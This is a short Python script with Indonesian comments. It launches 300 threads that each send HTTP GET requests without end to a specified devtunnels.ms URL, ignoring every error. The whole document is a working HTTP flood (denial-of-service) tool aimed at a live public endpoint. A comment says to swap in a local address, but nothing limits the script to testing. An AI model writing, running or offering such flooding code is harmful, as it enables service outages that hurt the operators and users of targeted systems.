import threading
import requests

def flood():
    while True:
        try:
            requests.get("https://xpvz1sxb-80.asse.devtunnels.ms/")  # Ganti dengan alamat lokal Anda
        except:
            pass

# Jalankan banyak thread
for _ in range(300):
    threading.Thread(target=flood).start()